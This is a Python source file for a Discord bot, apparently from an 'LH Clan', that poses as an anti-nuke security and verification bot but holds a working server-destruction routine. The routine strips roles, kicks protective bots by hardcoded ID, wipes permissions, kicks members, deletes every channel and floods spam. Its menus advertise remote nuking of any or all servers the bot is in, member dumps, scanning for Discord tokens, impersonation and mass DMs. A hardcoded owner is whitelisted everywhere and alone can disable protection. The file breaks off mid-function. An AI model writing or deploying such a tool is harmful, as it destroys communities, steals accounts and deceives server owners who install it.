# language: Python 3.13  |  file: bot.py  |  runtime: discord.py 2.x
# deps: discord.py — pip install discord.py

import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import secrets
import string
import os
import re
import time
from collections import defaultdict
from typing import Optional

# ── config ────────────────────────────────────────────────────
TOKEN              = os.environ.get("TOKEN")
VERIFY_ROLE_NAME   = "Verified"
LOG_CHANNEL_NAME   = "lh-antinuke-logs"
LOG_ROLE_NAME      = "LH Security"
PREMIUM_USER_ID    = 1224012443341160498

# ── known antinuke bot IDs ────────────────────────────────────
ANTINUKE_IDS = {
    159985870458322944,
    155149108183695360,
    235088799074484224,
    395087306962165763,
    282859044593598464,
    429457053791158281,
    573030148151189514,
    496683369965781012,
    715202395568095232,
    489977906714509312,
    505527697351696395,
}

# ── nuke config ───────────────────────────────────────────────
nuke_config = {
    "channel_name": "hooked by lh clan",
    "message":      "lol ur server doesn't even have any good protection get a job",
    "channel_count": 12,
    "spam_count":    100,
}

# ── token store ───────────────────────────────────────────────
active_tokens: dict[str, bool] = {}

# ── premium access store ──────────────────────────────────────
# {user_id: expiry_timestamp}  — float("inf") = permanent
premium_users: dict[int, float] = {
    PREMIUM_USER_ID: float("inf")
}

# ── antinuke state ────────────────────────────────────────────
antinuke_enabled:   dict[int, bool] = defaultdict(lambda: True)
antinuke_whitelist: dict[int, set]  = defaultdict(set)
action_log: dict[int, dict[int, list]] = defaultdict(lambda: defaultdict(list))

THRESHOLDS = {
    "channel_delete": (3, 5),
    "channel_create": (3, 5),
    "role_delete":    (3, 5),
    "kick":           (3, 5),
    "ban":            (2, 5),
    "webhook_create": (2, 10),
    "role_update":    (3, 5),
}

# ── intents ───────────────────────────────────────────────────
intents = discord.Intents.default()
intents.members         = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

DISCORD_TOKEN_REGEX = re.compile(
    r"[MNO][a-zA-Z0-9_-]{23,25}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,38}"
)


# ══════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════

def generate_token() -> str:
    alphabet = string.ascii_letters + string.digits
    return "LHT-" + "".join(secrets.choice(alphabet) for _ in range(24))

def has_valid_token(s: str) -> bool:
    return s.strip() in active_tokens

def consume_token(s: str):
    active_tokens.pop(s.strip(), None)

def is_premium(user_id: int) -> bool:
    expiry = premium_users.get(user_id)
    if expiry is None:
        return False
    if expiry == float("inf"):
        return True
    if time.time() < expiry:
        return True
    # expired — remove
    premium_users.pop(user_id, None)
    return False

def premium_expiry_str(user_id: int) -> str:
    expiry = premium_users.get(user_id)
    if expiry is None:
        return "No access"
    if expiry == float("inf"):
        return "Permanent"
    remaining = expiry - time.time()
    if remaining <= 0:
        return "Expired"
    days    = int(remaining // 86400)
    hours   = int((remaining % 86400) // 3600)
    minutes = int((remaining % 3600) // 60)
    parts   = []
    if days:    parts.append(f"{days}d")
    if hours:   parts.append(f"{hours}h")
    if minutes: parts.append(f"{minutes}m")
    return " ".join(parts) if parts else "< 1m"

async def notify_owner(embed: discord.Embed):
    try:
        owner = await bot.fetch_user(PREMIUM_USER_ID)
        await owner.send(embed=embed)
    except Exception:
        pass

async def get_or_create_log_channel(guild: discord.Guild) -> Optional[discord.TextChannel]:
    security_role = discord.utils.get(guild.roles, name=LOG_ROLE_NAME)
    if not security_role:
        try:
            security_role = await guild.create_role(
                name=LOG_ROLE_NAME,
                color=discord.Color.red(),
                hoist=True,
                reason="LH AntiNuke — security role"
            )
        except Exception:
            security_role = None

    log_ch = discord.utils.get(guild.text_channels, name=LOG_CHANNEL_NAME)
    if log_ch:
        return log_ch

    overwrites = {
        guild.default_role: discord.PermissionOverwrite(view_channel=False),
        guild.me:           discord.PermissionOverwrite(
            view_channel=True, send_messages=True, embed_links=True
        ),
    }
    if security_role:
        overwrites[security_role] = discord.PermissionOverwrite(
            view_channel=True, send_messages=False, read_message_history=True
        )

    try:
        category = discord.utils.get(guild.categories, name="🔒 LH Security")
        if not category:
            cat_ow = {
                guild.default_role: discord.PermissionOverwrite(view_channel=False),
                guild.me:           discord.PermissionOverwrite(view_channel=True),
            }
            if security_role:
                cat_ow[security_role] = discord.PermissionOverwrite(view_channel=True)
            category = await guild.create_category(
                "🔒 LH Security", overwrites=cat_ow, reason="LH AntiNuke"
            )

        log_ch = await guild.create_text_channel(
            LOG_CHANNEL_NAME,
            category=category,
            overwrites=overwrites,
            topic="LH AntiNuke event log. Restricted access only.",
            reason="LH AntiNuke — log channel"
        )
        return log_ch
    except Exception:
        return None

async def log_antinuke_event(guild: discord.Guild, embed: discord.Embed):
    log_ch = await get_or_create_log_channel(guild)
    if log_ch:
        try:
            await log_ch.send(embed=embed)
        except Exception:
            pass
    await notify_owner(embed)

async def antinuke_punish(guild: discord.Guild, member: discord.Member, reason: str):
    try:
        await guild.ban(member, reason=f"[AntiNuke] {reason}", delete_message_days=0)
        action = "Banned"
    except Exception:
        try:
            await member.kick(reason=f"[AntiNuke] {reason}")
            action = "Kicked"
        except Exception:
            action = "Failed to punish"

    embed = discord.Embed(
        title="🛡️ AntiNuke — Threat Neutralized",
        color=0xff0000,
        timestamp=discord.utils.utcnow()
    )
    embed.add_field(name="Server",  value=f"{guild.name} (`{guild.id}`)", inline=False)
    embed.add_field(name="User",    value=f"{member} (`{member.id}`)",    inline=False)
    embed.add_field(name="Action",  value=action,                         inline=True)
    embed.add_field(name="Reason",  value=reason,                         inline=False)
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.set_footer(text="LH AntiNuke System")
    await log_antinuke_event(guild, embed)

def check_threshold(guild_id: int, user_id: int, action: str) -> bool:
    max_actions, within_seconds = THRESHOLDS.get(action, (5, 10))
    now = time.time()
    log = action_log[guild_id][user_id]
    log.append((action, now))
    action_log[guild_id][user_id] = [(a, t) for a, t in log if now - t <= within_seconds]
    count = sum(1 for a, t in action_log[guild_id][user_id] if a == action)
    return count >= max_actions


# ══════════════════════════════════════════════════════════════
#  BOT EVENTS
# ══════════════════════════════════════════════════════════════

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"✅ Online as {bot.user}")
    print(f"✅ In {len(bot.guilds)} servers")
    for guild in bot.guilds:
        antinuke_whitelist[guild.id].add(PREMIUM_USER_ID)
        antinuke_whitelist[guild.id].add(bot.user.id)
        if guild.owner:
            antinuke_whitelist[guild.id].add(guild.owner.id)

async def setup_hook():
    bot.add_view(VerifyButton())
    bot.add_view(HelpView())

bot.setup_hook = setup_hook

@bot.event
async def on_guild_join(guild: discord.Guild):
    antinuke_whitelist[guild.id].add(PREMIUM_USER_ID)
    antinuke_whitelist[guild.id].add(bot.user.id)
    if guild.owner:
        antinuke_whitelist[guild.id].add(guild.owner.id)
    await get_or_create_log_channel(guild)

@bot.event
async def on_guild_remove(guild: discord.Guild):
    embed = discord.Embed(
        title="⚠️ Bot Removed from Server",
        description=(
            f"**Server:** {guild.name}\n"
            f"**ID:** `{guild.id}`\n"
            f"**Members:** {guild.member_count}"
        ),
        color=0xff9900,
        timestamp=discord.utils.utcnow()
    )
    await notify_owner(embed)


# ══════════════════════════════════════════════════════════════
#  ANTINUKE LISTENERS
# ══════════════════════════════════════════════════════════════

@bot.event
async def on_guild_channel_delete(channel):
    guild = channel.guild
    if not antinuke_enabled[guild.id]: return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
        if entry.user.id in antinuke_whitelist[guild.id]: return
        if entry.user.id == bot.user.id: return
        if check_threshold(guild.id, entry.user.id, "channel_delete"):
            await antinuke_punish(guild, entry.user, "Mass channel delete detected")
        break

@bot.event
async def on_guild_channel_create(channel):
    guild = channel.guild
    if not antinuke_enabled[guild.id]: return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_create):
        if entry.user.id in antinuke_whitelist[guild.id]: return
        if entry.user.id == bot.user.id: return
        if check_threshold(guild.id, entry.user.id, "channel_create"):
            await antinuke_punish(guild, entry.user, "Mass channel create detected")
        break

@bot.event
async def on_guild_role_delete(role):
    guild = role.guild
    if not antinuke_enabled[guild.id]: return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
        if entry.user.id in antinuke_whitelist[guild.id]: return
        if entry.user.id == bot.user.id: return
        if check_threshold(guild.id, entry.user.id, "role_delete"):
            await antinuke_punish(guild, entry.user, "Mass role delete detected")
        break

@bot.event
async def on_member_remove(member):
    guild = member.guild
    if not antinuke_enabled[guild.id]: return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
        if entry.target.id != member.id: break
        if entry.user.id in antinuke_whitelist[guild.id]: return
        if entry.user.id == bot.user.id: return
        if check_threshold(guild.id, entry.user.id, "kick"):
            await antinuke_punish(guild, entry.user, "Mass kick detected")
        break

@bot.event
async def on_member_ban(guild, user):
    if not antinuke_enabled[guild.id]: return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
        if entry.user.id in antinuke_whitelist[guild.id]: return
        if entry.user.id == bot.user.id: return
        if check_threshold(guild.id, entry.user.id, "ban"):
            offender = guild.get_member(entry.user.id)
            if offender:
                await antinuke_punish(guild, offender, "Mass ban detected")
        break

@bot.event
async def on_webhooks_update(channel):
    guild = channel.guild
    if not antinuke_enabled[guild.id]: return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.webhook_create):
        if entry.user.id in antinuke_whitelist[guild.id]: return
        if entry.user.id == bot.user.id: return
        if check_threshold(guild.id, entry.user.id, "webhook_create"):
            await antinuke_punish(guild, entry.user, "Mass webhook create detected")
        break

@bot.event
async def on_member_join(member):
    guild = member.guild
    if not antinuke_enabled[guild.id]: return
    if not member.bot: return
    if member.id in antinuke_whitelist[guild.id]: return
    if member.id == bot.user.id: return
    try:
        await member.kick(reason="[AntiNuke] Unauthorized bot join")
        embed = discord.Embed(
            title="🛡️ AntiNuke — Unauthorized Bot Blocked",
            color=0xff9900,
            timestamp=discord.utils.utcnow()
        )
        embed.add_field(name="Server", value=f"{guild.name} (`{guild.id}`)", inline=False)
        embed.add_field(name="Bot",    value=f"{member} (`{member.id}`)",    inline=False)
        embed.add_field(name="Action", value="Kicked on join",               inline=True)
        embed.set_thumbnail(url=member.display_avatar.url)
        embed.set_footer(text="LH AntiNuke System")
        await log_antinuke_event(guild, embed)
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════
#  INTERACTIVE HELP MENU
# ══════════════════════════════════════════════════════════════

def build_free_embed() -> discord.Embed:
    embed = discord.Embed(
        title="🆓 Free Commands",
        description=(
            "```\n"
            "Prefix : !      Slash  : /\n"
            "🔒 Admin = server admin only\n"
            "```"
        ),
        color=0x5865f2,
        timestamp=discord.utils.utcnow()
    )
    embed.add_field(
        name="━━━━━━ 💀 NUKE ━━━━━━",
        value=(
            "`!LH` — nuke current server 🔒\n"
            "`!LH GHOST` — clone top admin → nuke 🔒"
        ),
        inline=False
    )
    embed.add_field(
        name="━━━━━━ 🛡️ ANTINUKE ━━━━━━",
        value=(
            "`!antinuke on` — enable protection 🔒\n"
            "`!antinuke status` — view status 🔒\n"
            "`!antinuke setup` — create log channel 🔒"
        ),
        inline=False
    )
    embed.add_field(
        name="━━━━━━ 🎭 SOCIAL ━━━━━━",
        value="`!fake <msg>` — post as Discord system 🔒",
        inline=False
    )
    embed.add_field(
        name="━━━━━━ 🔐 VERIFY ━━━━━━",
        value="`/setupverify` — post professional verify panel 🔒",
        inline=False
    )
    embed.add_field(
        name="━━━━━━ 📬 DM ━━━━━━",
        value="`/dm <msg> <count> [member|user_id] [delay]`",
        inline=False
    )
    embed.add_field(
        name="━━━━━━ 📊 INFO ━━━━━━",
        value="`/serverinfo` · `/userinfo @user` · `/poll <q>` · `/ping`",
        inline=False
    )
    embed.set_footer(text="LH Clan Bot | Free Tier")
    return embed


def build_premium_embed(user_id: int) -> discord.Embed:
    has  = is_premium(user_id)
    exp  = premium_expiry_str(user_id) if has else "No Access"
    color = 0xffd700 if has else 0x555555

    embed = discord.Embed(
        title="👑 Premium Commands",
        description=(
            "```\n"
            "Prefix : !      Slash  : /\n"
            "🔑 Token  = LH premium token required\n"
            "⭐ Owner  = master user only\n"
            "👑 Premium = gifted premium access\n"
            "```"
        ),
        color=color,
        timestamp=discord.utils.utcnow()
    )
    embed.add_field(
        name="━━━━━━ 💀 NUKE ━━━━━━",
        value=(
            "`!LH EXEC <serverID> <token>` — remote nuke any server 🔑\n"
            "`!LH ALL <token>` — nuke ALL servers bot is in 🔑\n"
            "`!LH T` — generate a premium token ⭐\n"
            "`!LHP` — edit nuke config (name/msg/counts) 🔑"
        ),
        inline=False
    )
    embed.add_field(
        name="━━━━━━ 🛡️ ANTINUKE ━━━━━━",
        value=(
            "`!antinuke off` — disable protection ⭐\n"
            "`!antinuke whitelist add <id>` ⭐\n"
            "`!antinuke whitelist remove <id>` ⭐"
        ),
        inline=False
    )
    embed.add_field(
        name="━━━━━━ 📡 INTEL ━━━━━━",
        value=(
            "`!LHSPY` — list every server bot is in ⭐\n"
            "`!LHMEMBERS <serverID>` — full member dump ⭐\n"
            "`!LHTOKENS <serverID>` — scan for Discord tokens ⭐"
        ),
        inline=False
    )
    embed.add_field(
        name="━━━━━━ 🎭 SOCIAL ━━━━━━",
        value=(
            "`!impersonate <token> <userID> <msg>` — webhook clone 🔑\n"
            "`!massdm <token> <serverID> <msg>` — DM every member 🔑"
        ),
        inline=False
    )
    embed.add_field(
        name="━━━━━━ 🎁 PREMIUM GIFTING ━━━━━━",
        value=(
            "`!givepremium <userID> <duration>` — gift premium ⭐\n"
            "`!revokepremium <userID>` — revoke premium ⭐\n"
            "`!premiumlist` — list all premium users ⭐\n\n"
            "Duration examples: `1d`, `7d`, `30d`, `permanent`"
        ),
        inline=False
    )
    embed.add_field(
        name="━━━━━━ 🔑 YOUR ACCESS ━━━━━━",
        value=(
            f"Status: **{'✅ Active' if has else '❌ No Access'}**\n"
            f"Expires: **{exp}**"
        ),
        inline=False
    )
    embed.set_footer(text="LH Clan Bot | Premium Tier")
    return embed


class HelpView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=120)

    @discord.ui.button(
        label="Free Commands",
        emoji="🆓",
        style=discord.ButtonStyle.blurple,
        custom_id="help_free"
    )
    async def free_commands(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(embed=build_free_embed(), view=self)

    @discord.ui.button(
        label="Premium Commands",
        emoji="👑",
        style=discord.ButtonStyle.gold if hasattr(discord.ButtonStyle, 'gold') else discord.ButtonStyle.green,
        custom_id="help_premium"
    )
    async def premium_commands(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(
            embed=build_premium_embed(interaction.user.id), view=self
        )

    async def on_timeout(self):
        pass


# ══════════════════════════════════════════════════════════════
#  HELP COMMAND
# ══════════════════════════════════════════════════════════════

@bot.command(name="help")
async def help_cmd(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass

    # default view shows free commands
    embed = build_free_embed()
    view  = HelpView()

    # try ephemeral-style: send to channel but only visible to them
    # discord prefix commands can't do true ephemeral — send then delete after timeout
    try:
        msg = await ctx.send(embed=embed, view=view)
        # auto-delete after 2 minutes (view timeout)
        await asyncio.sleep(120)
        try:
            await msg.delete()
        except Exception:
            pass
    except Exception:
        # fallback: DM
        try:
            await ctx.author.send(embed=embed, view=view)
            await ctx.send("📬 Help sent to your DMs.", delete_after=5)
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════
#  PREMIUM GIFTING
# ══════════════════════════════════════════════════════════════

def parse_duration(s: str) -> Optional[float]:
    """
    parses duration string → seconds.
    accepts: 1d, 7d, 24h, 60m, permanent
    returns None on bad input, float("inf") for permanent
    """
    s = s.strip().lower()
    if s == "permanent":
        return float("inf")
    units = {"d": 86400, "h": 3600, "m": 60}
    if s[-1] in units:
        try:
            return float(s[:-1]) * units[s[-1]]
        except ValueError:
            return None
    return None


@bot.command(name="givepremium")
async def give_premium(ctx, user_id: str = None, duration: str = None):
    try:
        await ctx.message.delete()
    except Exception:
        pass

    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send(embed=discord.Embed(
            title="❌ Access Denied",
            description="Only the master user can gift premium.",
            color=0xff0000
        ), delete_after=5)
        return

    if not user_id or not duration:
        await ctx.send(
            "❌ Usage: `!givepremium <userID> <duration>`\n"
            "Duration: `1d`, `7d`, `30d`, `permanent`",
            delete_after=10
        )
        return

    secs = parse_duration(duration)
    if secs is None:
        await ctx.send(
            "❌ Invalid duration. Use: `1d`, `7d`, `30d`, `24h`, `permanent`",
            delete_after=5
        )
        return

    try:
        target_id = int(user_id)
        target    = await bot.fetch_user(target_id)
    except (ValueError, discord.NotFound):
        await ctx.send("❌ User not found.", delete_after=5)
        return

    if secs == float("inf"):
        premium_users[target_id] = float("inf")
        exp_str = "Permanent"
    else:
        premium_users[target_id] = time.time() + secs
        exp_str = premium_expiry_str(target_id)

    # notify the gifted user
    gift_embed = discord.Embed(
        title="👑 Premium Access Granted!",
        description=(
            f"You have been granted **LH Premium** access.\n\n"
            f"**Duration:** `{exp_str}`\n\n"
            "Use `!help` and click **Premium Commands** to see what you can use."
        ),
        color=0xffd700,
        timestamp=discord.utils.utcnow()
    )
    gift_embed.set_footer(text="LH Clan Bot | Premium")
    try:
        await target.send(embed=gift_embed)
    except Exception:
        pass

    # confirm to master
    confirm = discord.Embed(
        title="✅ Premium Gifted",
        color=0x00ff00,
        timestamp=discord.utils.utcnow()
    )
    confirm.add_field(name="User",     value=f"{target} (`{target_id}`)", inline=False)
    confirm.add_field(name="Duration", value=exp_str,                     inline=True)
    confirm.set_footer(text="LH Premium System")
    try:
        await ctx.author.send(embed=confirm)
        await ctx.send("✅ Premium gifted. Details sent to your DMs.", delete_after=5)
    except Exception:
        await ctx.send(embed=confirm, delete_after=10)


@bot.command(name="revokepremium")
async def revoke_premium(ctx, user_id: str = None):
    try:
        await ctx.message.delete()
    except Exception:
        pass

    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send(embed=discord.Embed(
            title="❌ Access Denied",
            description="Only the master user can revoke premium.",
            color=0xff0000
        ), delete_after=5)
        return

    if not user_id:
        await ctx.send("❌ Usage: `!revokepremium <userID>`", delete_after=5)
        return

    try:
        target_id = int(user_id)
    except ValueError:
        await ctx.send("❌ Invalid user ID.", delete_after=5)
        return

    if target_id == PREMIUM_USER_ID:
        await ctx.send("❌ Cannot revoke master user's premium.", delete_after=5)
        return

    if target_id not in premium_users:
        await ctx.send("❌ That user doesn't have premium.", delete_after=5)
        return

    premium_users.pop(target_id)

    # notify the user
    try:
        target = await bot.fetch_user(target_id)
        revoke_embed = discord.Embed(
            title="⚠️ Premium Access Revoked",
            description="Your LH Premium access has been revoked.",
            color=0xff0000,
            timestamp=discord.utils.utcnow()
        )
        revoke_embed.set_footer(text="LH Clan Bot")
        await target.send(embed=revoke_embed)
    except Exception:
        pass

    await ctx.send(f"✅ Premium revoked for `{target_id}`.", delete_after=5)


@bot.command(name="premiumlist")
async def premium_list(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass

    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send("❌ Access Denied.", delete_after=5)
        return

    embed = discord.Embed(
        title="👑 Premium Users",
        color=0xffd700,
        timestamp=discord.utils.utcnow()
    )

    if not premium_users:
        embed.description = "No premium users."
    else:
        lines = []
        for uid, expiry in premium_users.items():
            exp = "Permanent" if expiry == float("inf") else premium_expiry_str(uid)
            status = "✅" if is_premium(uid) else "❌ Expired"
            lines.append(f"`{uid}` — {exp} {status}")
        embed.description = "\n".join(lines)

    embed.set_footer(text=f"Total: {len(premium_users)} users")

    try:
        await ctx.author.send(embed=embed)
        await ctx.send("👑 Premium list sent to your DMs.", delete_after=5)
    except Exception:
        msg = await ctx.send(embed=embed)
        await asyncio.sleep(20)
        try:
            await msg.delete()
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════
#  ANTINUKE COMMANDS
# ══════════════════════════════════════════════════════════════

@bot.command(name="antinuke")
async def antinuke_cmd(ctx, action: str = None, *, args: str = None):
    try:
        await ctx.message.delete()
    except Exception:
        pass

    guild = ctx.guild

    if not action:
        await ctx.send("❌ Usage: `!antinuke <on|off|status|whitelist|setup>`", delete_after=5)
        return

    action = action.lower()

    if action == "on":
        if not ctx.author.guild_permissions.administrator:
            await ctx.send("❌ Administrator required.", delete_after=5)
            return
        antinuke_enabled[guild.id] = True
        embed = discord.Embed(
            title="🛡️ AntiNuke Enabled",
            description=(
                f"**{guild.name}** is now protected.\n\n"
                "**Watching:**\n"
                "• Mass channel deletes/creates\n"
                "• Mass role deletes\n"
                "• Mass kicks & bans\n"
                "• Unauthorized webhook creates\n"
                "• Unauthorized bot joins\n\n"
                f"Logs → `#{LOG_CHANNEL_NAME}` (hidden channel)"
            ),
            color=0x00ff00,
            timestamp=discord.utils.utcnow()
        )
        embed.set_footer(text="Only premium user can disable AntiNuke")
        try:
            await ctx.author.send(embed=embed)
            await ctx.send("🛡️ AntiNuke enabled. Details sent to DMs.", delete_after=5)
        except discord.Forbidden:
            msg = await ctx.send(embed=embed)
            await asyncio.sleep(15)
            try:
                await msg.delete()
            except Exception:
                pass
        return

    if action == "off":
        if ctx.author.id != PREMIUM_USER_ID:
            await ctx.send(embed=discord.Embed(
                title="❌ Access Denied",
                description="Only the **premium user** can disable AntiNuke.",
                color=0xff0000
            ), delete_after=5)
            return
        antinuke_enabled[guild.id] = False
        embed = discord.Embed(
            title="⚠️ AntiNuke Disabled",
            description=(
                f"Protection disabled for **{guild.name}**.\n"
                "Re-enable anytime with `!antinuke on`."
            ),
            color=0xff9900,
            timestamp=discord.utils.utcnow()
        )
        try:
            await ctx.author.send(embed=embed)
            await ctx.send("⚠️ AntiNuke disabled.", delete_after=5)
        except discord.Forbidden:
            msg = await ctx.send(embed=embed)
            await asyncio.sleep(10)
            try:
                await msg.delete()
            except Exception:
                pass
        return

    if action == "status":
        if not ctx.author.guild_permissions.administrator:
            await ctx.send("❌ Administrator required.", delete_after=5)
            return
        status = "🟢 ENABLED" if antinuke_enabled[guild.id] else "🔴 DISABLED"
        wl     = antinuke_whitelist[guild.id]
        wl_str = "\n".join([f"<@{uid}> (`{uid}`)" for uid in wl]) or "None"
        embed  = discord.Embed(
            title="🛡️ AntiNuke Status",
            color=0x00ff00 if antinuke_enabled[guild.id] else 0xff0000,
            timestamp=discord.utils.utcnow()
        )
        embed.add_field(name="Status",  value=f"**{status}**",         inline=False)
        embed.add_field(name="Server",  value=guild.name,              inline=True)
        embed.add_field(name="Members", value=str(guild.member_count), inline=True)
        embed.add_field(
            name="Thresholds",
            value=(
                "• Channel delete: **3 in 5s**\n"
                "• Channel create: **3 in 5s**\n"
                "• Role delete:    **3 in 5s**\n"
                "• Kick:           **3 in 5s**\n"
                "• Ban:            **2 in 5s**\n"
                "• Webhook create: **2 in 10s**"
            ),
            inline=False
        )
        embed.add_field(name="Whitelist", value=wl_str, inline=False)
        embed.set_footer(text="LH AntiNuke System | Premium user can disable")
        try:
            await ctx.author.send(embed=embed)
            await ctx.send("🛡️ Status sent to your DMs.", delete_after=5)
        except discord.Forbidden:
            msg = await ctx.send(embed=embed)
            await asyncio.sleep(20)
            try:
                await msg.delete()
            except Exception:
                pass
        return

    if action == "whitelist":
        if ctx.author.id != PREMIUM_USER_ID:
            await ctx.send("❌ Only premium user can manage whitelist.", delete_after=5)
            return
        if not args or len(args.split()) < 2:
            await ctx.send("❌ Usage: `!antinuke whitelist <add|remove> <userID>`", delete_after=5)
            return
        parts = args.split()
        sub   = parts[0].lower()
        try:
            target_id = int(parts[1])
        except ValueError:
            await ctx.send("❌ Invalid user ID.", delete_after=5)
            return
        if sub == "add":
            antinuke_whitelist[guild.id].add(target_id)
            await ctx.send(f"✅ `{target_id}` added to whitelist.", delete_after=5)
        elif sub == "remove":
            antinuke_whitelist[guild.id].discard(target_id)
            await ctx.send(f"✅ `{target_id}` removed from whitelist.", delete_after=5)
        else:
            await ctx.send("❌ Usage: `!antinuke whitelist <add|remove> <userID>`", delete_after=5)
        return

    if action == "setup":
        if not ctx.author.guild_permissions.administrator:
            await ctx.send("❌ Administrator required.", delete_after=5)
            return
        ch = await get_or_create_log_channel(guild)
        if ch:
            await ctx.send(
                f"✅ Log channel ready: {ch.mention} — only `{LOG_ROLE_NAME}` role can see it.",
                delete_after=10
            )
        else:
            await ctx.send("❌ Failed to create log channel. Check bot permissions.", delete_after=5)
        return

    await ctx.send("❌ Unknown action. Use: `on`, `off`, `status`, `whitelist`, `setup`", delete_after=5)


# ══════════════════════════════════════════════════════════════
#  VERIFY
# ══════════════════════════════════════════════════════════════

class VerifyButton(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(
        label="Verify",
        emoji="✅",
        style=discord.ButtonStyle.green,
        custom_id="verify_button"
    )
    async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = interaction.guild
        role  = discord.utils.get(guild.roles, name=VERIFY_ROLE_NAME)

        if not role:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Setup Error",
                    description=(
                        f"No role named `{VERIFY_ROLE_NAME}` found.\n"
                        "Please contact an administrator."
                    ),
                    color=0xff0000
                ),
                ephemeral=True
            )
            return

        if role in interaction.user.roles:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="Already Verified",
                    description="You already have the verified role.",
                    color=0x5865f2
                ),
                ephemeral=True
            )
            return

        try:
            await interaction.user.add_roles(role, reason="Passed verification")
            embed = discord.Embed(
                title="✅ Verification Successful",
                description=(
                    f"Welcome to **{guild.name}**, {interaction.user.mention}!\n\n"
                    "You now have full access to the server.\n"
                    "Read the rules and enjoy your stay."
                ),
                color=0x00ff00,
                timestamp=discord.utils.utcnow()
            )
            embed.set_thumbnail(url=interaction.user.display_avatar.url)
            embed.set_footer(
                text=f"{guild.name} Verification System",
                icon_url=guild.icon.url if guild.icon else None
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)

            log_embed = discord.Embed(
                title="👤 Member Verified",
                color=0x00ff00,
                timestamp=discord.utils.utcnow()
            )
            log_embed.add_field(
                name="User",
                value=f"{interaction.user} (`{interaction.user.id}`)",
                inline=False
            )
            log_embed.add_field(name="Role", value=role.mention, inline=True)
            log_embed.set_thumbnail(url=interaction.user.display_avatar.url)
            log_embed.set_footer(text="LH Verification Log")
            log_ch = await get_or_create_log_channel(guild)
            if log_ch:
                try:
                    await log_ch.send(embed=log_embed)
                except Exception:
                    pass

        except discord.Forbidden:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Permission Error",
                    description=(
                        "The bot doesn't have permission to assign roles.\n"
                        "Please contact an administrator."
                    ),
                    color=0xff0000
                ),
                ephemeral=True
            )


@bot.tree.command(name="setupverify", description="Post the professional verification panel (admin only)")
@app_commands.checks.has_permissions(administrator=True)
async def setupverify(interaction: discord.Interaction):
    guild = interaction.guild
    embed = discord.Embed(
        title="🔐 Server Verification",
        description=(
            f"**Welcome to {guild.name}!**\n\n"
            "To gain access to the server, you must verify your account.\n\n"
            "**How to verify:**\n"
            "› Click the **Verify** button below\n"
            "› You will instantly receive access\n\n"
            "**Why verify?**\n"
            "› Keeps the server safe from bots and raiders\n"
            "› Unlocks all channels and features\n\n"
            "*By verifying, you agree to follow the server rules.*"
        ),
        color=0x5865f2,
        timestamp=discord.utils.utcnow()
    )
    embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
    embed.set_footer(
        text=f"{guild.name} • Verification System",
        icon_url=guild.icon.url if guild.icon else None
    )
    await interaction.response.send_message(embed=embed, view=VerifyButton())


# ══════════════════════════════════════════════════════════════
#  CORE NUKE ENGINE
# ══════════════════════════════════════════════════════════════

async def run_nuke(guild: discord.Guild):
    strip_tasks = []
    for member in guild.members:
        if member.bot and member != guild.me:
            strip_tasks.append(member.edit(roles=[], reason="LH — neutralize"))
    await asyncio.gather(*strip_tasks, return_exceptions=True)

    antinuke_kicks = []
    for member in guild.members:
        if member.id in ANTINUKE_IDS:
            antinuke_kicks.append(member.kick(reason="LH — antinuke removal"))
    await asyncio.gather(*antinuke_kicks, return_exceptions=True)

    role_tasks = []
    for role in guild.roles:
        if role >= guild.me.top_role: continue
        if role.is_default(): continue
        role_tasks.append(
            role.edit(permissions=discord.Permissions.none(), reason="LH — permission wipe")
        )
    await asyncio.gather(*role_tasks, return_exceptions=True)

    kick_tasks = []
    for member in guild.members:
        if member == guild.me or member == guild.owner or member.bot: continue
        kick_tasks.append(member.kick(reason="LH Clan"))
    await asyncio.gather(*kick_tasks, return_exceptions=True)

    delete_tasks = [ch.delete() for ch in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    new_channels = []
    for _ in range(nuke_config["channel_count"]):
        try:
            ch = await guild.create_text_channel(nuke_config["channel_name"])
            new_channels.append(ch)
        except Exception:
            pass

    async def spam_channel(channel):
        for _ in range(nuke_config["spam_count"]):
            try:
                await channel.send(nuke_config["message"])
            except Exception:
                pass

    await asyncio.gather(*[spam_channel(ch) for ch in new_channels])


# ══════════════════════════════════════════════════════════════
#  LH — nuke + subcommands
# ══════════════════════════════════════════════════════════════

@bot.command(name="LH")
async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[str] = None):

    if subcommand and subcommand.upper() == "T":
        if ctx.author.id != PREMIUM_USER_ID:
            await ctx.send(embed=discord.Embed(
                title="❌ Access Denied", description="Owner only.", color=0xff0000
            ), delete_after=5)
            try: await ctx.message.delete()
            except Exception: pass
            return
        tok = generate_token()
        active_tokens[tok] = True
        embed = discord.Embed(
            title="🔑 Premium Token Generated",
            description=(
                f"**Token:** `{tok}`\n\n"
                "Use with `!LHP` to edit nuke settings.\n"
